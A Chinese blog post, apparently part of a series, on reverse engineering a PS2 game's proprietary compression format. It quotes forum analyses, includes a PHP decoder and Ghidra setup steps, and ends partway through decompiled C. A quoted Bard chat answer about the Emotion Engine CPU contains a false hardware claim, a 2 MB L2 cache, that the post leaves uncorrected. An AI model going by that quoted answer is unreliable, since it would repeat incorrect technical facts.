        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某上古 PS2 游戏逆向（四）文件格式分析与逆向</title>
      <link href="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
      <url>/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="文件结构分析"><a href="# 文件结构分析" class="headerlink" title="文件结构分析"></a>文件结构分析 </h1><p><a href="https://srpopty.github.io/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/"> 前文 </a> 中通过简单地观察 <code>.HD</code> 和 <code>.BIN</code> 的对应关系以及大量的 <code>\xFF</code> 分隔符，实现了文件的初步提取，但是 <code>NORMAL</code>、<code>SCENE_ID</code>、<code>SCENEDAT</code>、<code>SYSTEM</code>、<code>VOICE_ID</code> 六个 <code>.BIN</code> 中，我们仅成功恢复了明文保存的 <code>SYSTEM</code> 以及 ADPCM 的 <code>VOICE_ID</code>，其余 4 个文件格式仍然未知。</p><p>我们首先从文件较小的 <code>NORMAL</code> 开始分析。多分析几个文件可以发现比较明显的特征：首先文件开头 4 个字节是一个 int 数字，根据分析 <code>.HD</code> 中的经验，推测可能是文件大小，但是这个数字总是比我们提取出的文件的文件大小要大。接着 4 个字节取值为 1、2、3、4、5、6、7、8、9、10，推测是一个标识位，之后一个字节是非 ASCII 字节。从第 10 个字节开始是文件的正文。</p><p>在第 9 个文件中发现了大量明文，看起来是一个结构类似 ini 的配置文件，而且根据内容判断是 <code>SYSTEM</code> 中每个 nut 文件的名字，但是其中仍然包含了不属于明文的字节。</p><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/1.jpg" alt="NORMAL.BIN 的第 9 个文件"></p><p>同样在 <code>NORMAL</code> 的第 13 个文件中也发现了应该保存 <code>NORMAL</code> 中的文件名的文件，那么首先可以确定这两个文件一定是以明文保存的文件。</p><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/2.jpg" alt="NORMAL.BIN 的第 13 个文件"></p><p>分析文件内容可以发现，大部分非 ASCII 字节连续序列以 <code>\xFF</code> 结尾，并且结合字节序列前后文本可以推测该文件被某种加密算法压缩，以及文件开头 4 个字节的 int 是文件压缩前大小。</p><p>将各种已知压缩算法均尝试了一遍以后，发现这是游戏作者自己实现的压缩技术。懒得逆程序，Google 了一下，发现有人也在逆向这个游戏，但是同样被这个 16 年前的压缩技术所困惑。<a href="https://www.vg-resource.com/thread-42169.html">帖子 </a> 里有两个老哥通过逆向游戏主程序，找到了解压缩函数，并且提取出了算法。</p><p>首先第一个老哥 <code>Raccoon Sam</code> 给出了自己的理解：</p><blockquote><p>Hey there!<br>Bad news – I really can’t wrap my head around it, I’m afraid :C</p><p>I’ve got samples for a compressed TIM2 file (“paktim” is just my nomenclature) extracted from the SCENEDAT and a legitimate, uncompressed counterpart TIM2 for it extracted from your save state. You can download them &gt; here.</p><p>The first eight bytes in the paktim are a header; 40 64 04 00 01 00 00 00 which should be read as two words, 00046440 00000001 which in turn just define the uncompressed size (0x46440 or 287808 bytes, which unsurprisingly is the file size of the legitimate TIM2 file) and the amount of files in the entry (1, which &gt; unsurprisingly is the … uh, amount of files)</p><p>After that, you read a byte as the variable instruction.<br>Logical AND instruction with 0x1F and add 2 to it to get the variable amount.<br>Shift instruction right five times to get the variable method.</p><p>According to the method and amount, read bytes from the bytestream:<br>Method 7 is just “read amount bytes and write them to output”.<br>Method 6 is “read 1 byte as surrogate and then repeat that byte exactly amount times to the output”.<br>Method 0 is “repeat FF exactly amount times to the output”.</p><p>The other methods are…. yeah, I dunno. Some methods look like they make sense but then the same method used later in the file does something completely different. I really can’t figure out what the trick here &gt; is. Really hope someone else takes a look at this, it’s driving me nuts!!</p></blockquote><p>文件开头 4 个字节的确是未压缩大小，之后 4 个字节帖子里的老哥认为是文件数量（不过这个并不是文件数量），之后读取 1 个字节作为 <code>instruction</code>，并进行 2 个运算得到 2 个变量：</p><ol><li><code>instruction &amp; 0x1f + 2</code> 可以得到 <code>amount</code> 变量。</li><li><code>instruction &gt;&gt; 5</code> 可以得到 <code>method</code> 变量。</li></ol><p>如果 <code>method</code> 是 7，则读取接下来 <code>amount</code> 个字节作为输出。</p><p>如果 <code>method</code> 是 6，则读取下一个字节并且重复 <code>amount</code> 次作为输出。</p><p>如果 <code>method</code> 是 0，则重复 <code>\xff</code> 字节 <code>amount</code> 次作为输出。</p><p>不过这哥们道行还是有点浅，并没有逆完整，所以这个并不是最终的解压算法，就在这哥们放弃以后，有一个老哥 <code>rufaswan</code> 觉得很有意思，并且接着逆出了“看似“完整的解压算法：</p><blockquote><p>I can see why this game trip you up. I don’t think I saw this kind of compression algorithm before. But I have a good understanding of it now.</p><p>Let’s use an example for a start, you want to duplicate 0xC9 for 0x40 times. First you use method 6 for 0x1f+2 bytes, so you’ll get “DF C9”. For the remaining 0x1f bytes, you repeat the last command, or method 0, but with length 0x1d+2 instead, so you’ll get “1D”.</p><p>Hence, the compressed data to duplicate 0xC9 for 0x40 times is “DF C9 1D”.</p><p>And the game keep the last 6 commands as history, or method 0 to 5.</p></blockquote><p>首先文件开始的 8 个字节就像上一个老哥逆的一样，是文件大小和文件数量（实际并不是文件数量），之后读取一个字节 <code>BYTE</code>，计算出 2 个变量：</p><ol><li><code>BYTE &amp; 0x1f</code> 可以得到 <code>LEN</code> 变量</li><li><code>BYTE &gt;&gt; 5</code> 可以得到 <code>METHOD</code> 变量</li></ol><p>如果 <code>METHOD</code> 是 7，则读取接下来 <code>LEN + 1</code> 个字节作为输出。</p><p>如果 <code>METHOD</code> 是 6，则读取下一个字节并且重复 <code>LEN + 2</code> 次作为输出。</p><p>在上述操作完成后，将其作为 <code>current</code> 放入 <code>HISTORY</code> 队列末尾：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HISTORY[<span class="number">5</span>] = HISTORY[<span class="number">4</span>]</span><br><span class="line">HISTORY[<span class="number">4</span>] = HISTORY[<span class="number">3</span>]</span><br><span class="line">HISTORY[<span class="number">3</span>] = HISTORY[<span class="number">2</span>]</span><br><span class="line">HISTORY[<span class="number">2</span>] = HISTORY[<span class="number">1</span>]</span><br><span class="line">HISTORY[<span class="number">1</span>] = HISTORY[<span class="number">0</span>]</span><br><span class="line">HISTORY[<span class="number">0</span>] = current</span><br></pre></td></tr></table></figure><p>如果 <code>METHOD</code> 在 <code>[0,5]</code> 之间，则作为 <code>current</code> 并且重新整理在<code>HISTORY</code> 中 <code>METHOD</code> 之前的所有元素，例如当 <code>METHOD</code> 是 3 时，则：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HISTORY[<span class="number">5</span>] <span class="comment">// do nothing</span></span><br><span class="line">HISTORY[<span class="number">4</span>] <span class="comment">// do nothing</span></span><br><span class="line">current = HISTORY[<span class="number">3</span>]</span><br><span class="line">HISTORY[<span class="number">3</span>] = HISTORY[<span class="number">2</span>] <span class="comment">// re-queue</span></span><br><span class="line">HISTORY[<span class="number">2</span>] = HISTORY[<span class="number">1</span>] <span class="comment">// re-queue</span></span><br><span class="line">HISTORY[<span class="number">1</span>] = HISTORY[<span class="number">0</span>] <span class="comment">// re-queue</span></span><br><span class="line">HISTORY[<span class="number">0</span>] = current <span class="comment">// re-queue</span></span><br></pre></td></tr></table></figure><p>如果连续的 <code>METHOD</code> 是 6，则重复下一个字节 <code>LEN + 2</code> 次作为输出。</p><p>如果连续的 <code>METHOD</code> 是 7，则从 <code>LEN</code> 中提取 2 个变量：</p><ol><li><code>LEN &amp; 3</code> 得到变量 <code>SUB_LEN</code></li><li><code>LEN &gt;&gt; 2</code> 得到变量 <code>SUB_POS</code></li></ol><p>之后从 <code>SUB_POS</code> 开始读取 <code>SUB_LEN + 1</code> 个字节作为输出。</p><p>最后这个老哥给了他对应的 PHP <a href="https://github.com/rufaswan/Web2D_Games/blob/master/tools/psxtools/ps2_zero_hd-bin.php">代码</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update_dict</span>(<span class="params"> &amp;<span class="variable">$dict</span>, <span class="variable">$lv</span>, &amp;<span class="variable">$e</span> </span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$lv</span> &gt;= <span class="number">5</span> )  <span class="variable">$dict</span>[<span class="number">5</span>] = <span class="variable">$dict</span>[<span class="number">4</span>]; <span class="comment">// -69c0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$lv</span> &gt;= <span class="number">4</span> )  <span class="variable">$dict</span>[<span class="number">4</span>] = <span class="variable">$dict</span>[<span class="number">3</span>]; <span class="comment">// -69c4</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$lv</span> &gt;= <span class="number">3</span> )  <span class="variable">$dict</span>[<span class="number">3</span>] = <span class="variable">$dict</span>[<span class="number">2</span>]; <span class="comment">// -69c8</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$lv</span> &gt;= <span class="number">2</span> )  <span class="variable">$dict</span>[<span class="number">2</span>] = <span class="variable">$dict</span>[<span class="number">1</span>]; <span class="comment">// -69cc</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$lv</span> &gt;= <span class="number">1</span> )  <span class="variable">$dict</span>[<span class="number">1</span>] = <span class="variable">$dict</span>[<span class="number">0</span>]; <span class="comment">// -69d0</span></span><br><span class="line">    <span class="variable">$dict</span>[<span class="number">0</span>] = <span class="variable">$e</span>; <span class="comment">// -69d4</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">zero_decode</span>(<span class="params"> &amp;<span class="variable">$file</span>, <span class="variable">$siz</span> </span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$dec</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">trace</span>(<span class="string">&quot;== begin sub_116048\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$dict</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">6</span>, ZERO),</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">6</span>, ZERO),</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">6</span>, ZERO),</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">6</span>, ZERO),</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">6</span>, ZERO),</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">6</span>, ZERO),</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$st</span> = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$siz</span> &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$by</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$file</span>[<span class="variable">$st</span>] );</span><br><span class="line">            <span class="variable">$st</span>++;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable">$by</span> &gt;&gt; <span class="number">5</span>;</span><br><span class="line">        <span class="variable">$len</span> = <span class="variable">$by</span> &amp; <span class="number">0x1f</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$cmd</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>: <span class="comment">// c0</span></span><br><span class="line">                <span class="variable">$b</span> = <span class="variable">$file</span>[<span class="variable">$st</span>];</span><br><span class="line">                    <span class="variable">$st</span>++;</span><br><span class="line">                <span class="variable">$e</span> = <span class="keyword">array</span>(<span class="variable">$cmd</span>, <span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">update_dict</span>(<span class="variable">$dict</span>, <span class="variable">$cmd</span>, <span class="variable">$e</span>);</span><br><span class="line">                <span class="variable">$dec</span> .= <span class="title function_ invoke__">str_repeat</span>(<span class="variable">$b</span>, <span class="variable">$len</span> + <span class="number">2</span>);</span><br><span class="line">                <span class="variable">$siz</span> -= (<span class="variable">$len</span> + <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>: <span class="comment">// e0</span></span><br><span class="line">                <span class="variable">$b</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, <span class="variable">$st</span>, <span class="variable">$len</span> + <span class="number">1</span>);</span><br><span class="line">                    <span class="variable">$st</span> += (<span class="variable">$len</span> + <span class="number">1</span>);</span><br><span class="line">                <span class="variable">$e</span> = <span class="keyword">array</span>(<span class="variable">$cmd</span>, <span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">update_dict</span>(<span class="variable">$dict</span>, <span class="variable">$cmd</span>, <span class="variable">$e</span>);</span><br><span class="line">                <span class="variable">$dec</span> .= <span class="variable">$b</span>;</span><br><span class="line">                <span class="variable">$siz</span> -= (<span class="variable">$len</span> + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="variable">$ref</span> = <span class="variable">$dict</span>[<span class="variable">$cmd</span>];</span><br><span class="line">                <span class="title function_ invoke__">update_dict</span>(<span class="variable">$dict</span>, <span class="variable">$cmd</span>, <span class="variable">$ref</span>);</span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable">$ref</span>[<span class="number">0</span>] )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">6</span>: <span class="comment">// c0</span></span><br><span class="line">                        <span class="variable">$dec</span> .= <span class="title function_ invoke__">str_repeat</span>(<span class="variable">$ref</span>[<span class="number">1</span>], <span class="variable">$len</span> + <span class="number">2</span>);</span><br><span class="line">                        <span class="variable">$siz</span> -= (<span class="variable">$len</span> + <span class="number">2</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">7</span>: <span class="comment">// e0</span></span><br><span class="line">                        <span class="variable">$dp</span> = <span class="variable">$len</span> &gt;&gt; <span class="number">2</span>;</span><br><span class="line">                        <span class="variable">$dl</span> = <span class="variable">$len</span> &amp;  <span class="number">3</span>;</span><br><span class="line">                        <span class="variable">$b</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$ref</span>[<span class="number">1</span>], <span class="variable">$dp</span>, <span class="variable">$dl</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$dec</span> .= <span class="variable">$b</span>;</span><br><span class="line">                        <span class="variable">$siz</span> -= (<span class="variable">$dl</span> + <span class="number">1</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">goto</span> done;</span><br><span class="line">                &#125; <span class="comment">// switch ($ref[0] )</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="comment">// switch ($cmd)</span></span><br><span class="line">    &#125; <span class="comment">// while ($siz &gt; 0)</span></span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    <span class="title function_ invoke__">trace</span>(<span class="string">&quot;== end sub_116048\n&quot;</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$dec</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个老哥解释的比较抽象，实际上这是一个分块压缩算法，用一句话总结：解压缩时，对于每个 chunk 的第一个字节，低 5 位保存了长度，高 3 位保存了压缩方法，之后利用一个队列实现流式的 chunk 解压缩。</p><p>用这个老哥提供的代码写了个对应的 Python 版本进行解压缩，前文中提到 <code>NORMAL</code> 中第 9 个和第 13 个文件都成功解压缩，并且解压出了部分 TIM2 图片和 BMP 图片，其中 BMP 图片很明显是一个码表。</p><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/3.bmp" alt="解压出的码表"></p><p>不过很可惜，这老哥逆的也不完整，按照这老哥的解压算法，仍然有部分文件解出来仍然是一个未知格式的文件，但是根据前面提到的 第 13 个文件包含了 <code>NORMAL</code> 中的文件名，在第 10～12 这三个文件中理论上应该保存的也是明文，但是解压出来的却是乱码。</p><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/4.jpg" alt="理论上应该解压出明文的文件"></p><p>例如第 10 个文件 <code>SCENE_ID.LST</code> 解压出的效果如下，很明显不可能是文件名列表。</p><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/5.jpg" alt="SCENE_ID.LST 解压出的乱码"></p><p>通过 review 老哥的算法可以发现，从始至终都没有使用过文件开头的第 5～8 个字节，也就是前文中所谓的”文件数量“，这 4 个字节如果没有任何作用的话也就不会被塞在文件开头并且占用 4 个字节的空间，对于寸土寸金的 PS2，4 个字节也是挺奢侈的。</p><p>实际上通过观察解压缩失败与成功的文件，可以很容易得出结论：当第 5～8 个字节是 1 时，才会解压缩成功，否则解压缩出的就是乱码。至此我们推测，这个数字要么是表示压缩算法的种类，要么作为一个常量参与解压缩运算中，只不过当其取值为 1 时，这老哥的解压缩算法刚好正确。总之这老哥逆向逆一半，最后还得自己亲自逆，好在这老哥在代码中提供了解压缩函数的地址 <code>sub_116048</code>，自己动手，丰衣足食。</p><h1 id="MIPS 逆向准备"><a href="#MIPS 逆向准备" class="headerlink" title="MIPS 逆向准备"></a>MIPS 逆向准备 </h1><p><a href="https://srpopty.github.io/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/"> 前文 </a> 中脚本语言分析完成后，还有存在很多没有定义的函数，那么剩下来的只有游戏主程序 <code>SLPS_258.97</code> 中可能存在这些函数的定义以及实现。好在 Ghidra 提供了 MIPS 反编译能力。虽然 PS2 的 CPU 5900l <code>Emotion Engine</code> 使用了 32 位的 MIPS-III，但是却是自定义的精简 MIPS 指令集，类似 microMIPS，在 MIPS16e 的基础上增删了一些指令。</p><hr><p><strong>Srpopty</strong>: Does the PlayStation2 use MIPS16e?</p><p><strong>Bard</strong>: No, the PlayStation 2 does not use MIPS16e. It uses a custom RISC processor called the Emotion Engine (EE). The EE is based on the MIPS III architecture, but it includes a number of extensions that are not found in MIPS16e. For example, the EE has a floating-point unit, which is not present in MIPS16e. The EE also has a number of instructions that are specifically designed for multimedia applications.</p><p>The PlayStation 2 was released in 2000, and at the time, MIPS16e was not a widely used architecture. MIPS16e was designed for embedded systems, and it was not considered to be powerful enough for high-end gaming consoles. The EE was a more powerful architecture that was better suited for the PlayStation 2’s target market.</p><p>Here are some additional details about the Emotion Engine:</p><p>The Emotion Engine is a 32-bit RISC processor.<br>The EE has a clock speed of 300 MHz.<br>The EE has a 2 MB L2 cache.<br>The EE has a floating-point unit.<br>The EE has a number of instructions that are specifically designed for multimedia applications.<br>The Emotion Engine was a powerful processor for its time, and it helped to make the PlayStation 2 one of the most successful gaming consoles of all time.</p><hr><p>因此直接用 Ghidra 内置的 MIPS 处理器无法完全识别所有指令，因此需要安装额外的 Ghidra 扩展 <a href="https://github.com/beardypig/ghidra-emotionengine">ghidra-emotionengine</a> 或者 <a href="https://github.com/chaoticgd/ghidra-emotionengine-reloaded">ghidra-emotionengine-reloaded</a>，根据 Ghidra 的版本安装不同的 Release，其中 ghidra-emotionengine 仅支持到 9.3，之后的 Ghidra 版本需要使用 ghidra-emotionengine-reloaded 提供的 Relase。</p><p>下载好的 Ghidra 扩展是一个 zip 压缩包，将解压后的文件夹移动到 <code>~/.ghidra/.ghidra_xx.xx_PUBLIC/Extensions/</code> 目录下，之后在 GUI 的 Project 界面的 File 下就可以加载扩展</p><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/25.jpg" alt="Ghidra 开启反汇编 Emotion Engine 指令插件"></p><p>之后重启 Ghidra 后就可以用扩展提供的 r5900 处理器分析 <code>SLPS_258.97</code>，这时就可以正常解析指令。</p><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/26.jpg" alt="Ghidra 开启反汇编"></p><h1 id="解压缩算法逆向"><a href="# 解压缩算法逆向" class="headerlink" title="解压缩算法逆向"></a>解压缩算法逆向 </h1><p> 逆向工作准备完成后，马不停蹄地来到前面老哥提供的解压缩函数 <code>0x116048</code> 处，结合 PCSX2 的 debuger 做了一些简单的分析（PCSX2 的 debugger 是真难用）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">decompress</span><span class="params">(byte *data,byte *dst,<span class="type">int</span> param_3,ulong size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> bVar1;</span><br><span class="line">  <span class="type">int</span> *piVar2;</span><br><span class="line">  <span class="type">int</span> *piVar3;</span><br><span class="line">  <span class="type">int</span> *piVar4;</span><br><span class="line">  <span class="type">int</span> *piVar5;</span><br><span class="line">  <span class="type">int</span> *piVar6;</span><br><span class="line">  ulong uVar7;</span><br><span class="line">  ulong uVar8;</span><br><span class="line">  byte *pbVar9;</span><br><span class="line">  byte *ref_0;</span><br><span class="line">  byte *end;</span><br><span class="line">  uint command;</span><br><span class="line">  ulong length;</span><br><span class="line">  ulong pos;</span><br><span class="line">  byte instruction;</span><br><span class="line">  </span><br><span class="line">  uVar8 = (ulong)(<span class="type">int</span>)dst;</span><br><span class="line">  end = dst + (<span class="type">int</span>)size;</span><br><span class="line">  uVar7 = (ulong)(<span class="type">int</span>)(end + <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  instruction = *data;</span><br><span class="line">  pos = uVar8;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    piVar3 = <span class="built_in">queue</span>[<span class="number">4</span>];</span><br><span class="line">    piVar6 = <span class="built_in">queue</span>[<span class="number">3</span>];</span><br><span class="line">    piVar4 = <span class="built_in">queue</span>[<span class="number">2</span>];</span><br><span class="line">                    <span class="comment">/* command == 6 */</span></span><br><span class="line">    pbVar9 = (byte *)pos;</span><br><span class="line">    <span class="keyword">if</span> ((instruction &amp; <span class="number">0xe0</span>) == <span class="number">0xc0</span>) &#123;</span><br><span class="line">      *<span class="built_in">queue</span>[<span class="number">5</span>] = *<span class="built_in">queue</span>[<span class="number">4</span>];</span><br><span class="line">      piVar5 = <span class="built_in">queue</span>[<span class="number">1</span>];</span><br><span class="line">      piVar2 = <span class="built_in">queue</span>[<span class="number">0</span>];</span><br><span class="line">      length = (<span class="type">long</span>)(<span class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">0x1f</span>) + <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (uVar7 &lt; (ulong)(<span class="type">long</span>)(<span 